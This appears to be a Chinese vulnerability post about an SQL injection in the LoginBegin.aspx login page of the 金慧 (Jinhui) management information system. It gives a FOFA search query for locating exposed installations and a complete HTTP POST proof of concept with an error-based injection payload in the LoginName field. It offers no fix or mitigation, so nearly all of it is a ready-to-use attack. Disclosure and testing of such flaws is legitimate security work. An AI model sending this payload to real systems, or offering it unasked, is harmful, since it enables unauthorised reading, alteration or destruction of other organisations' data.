# 金慧综合管理信息系统LoginBegin.aspx存在SQL注入漏洞

金慧综合管理信息系统LoginBegin.aspx存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```kotlin
body="/Portal/LoginBegin.aspx"
```

## poc

```javascript
POST /Portal/LoginBegin.aspx?ReturnUrl=%2f HTTP/1.1
Host:127.0.0.1
User-Agent:Mozilla/4.0(compatible; MSIE 6.0;Windows NT 5.1; SV1;QQDownload732;.NET4.0C;.NET4.0E)
Content-Length:363
Content-Type: application/x-www-form-urlencoded
X-Requested-With:XMLHttpRequest
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

Todo=Validate&LoginName=1%27+AND+5094+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285094%3D5094%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29+AND+%27JKJg%27%3D%27JKJg&Password=&CDomain=Local&FromUrl=
```

![9bf0a2e8296781c0d73ecfc9854d1bc0](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410071441284.png)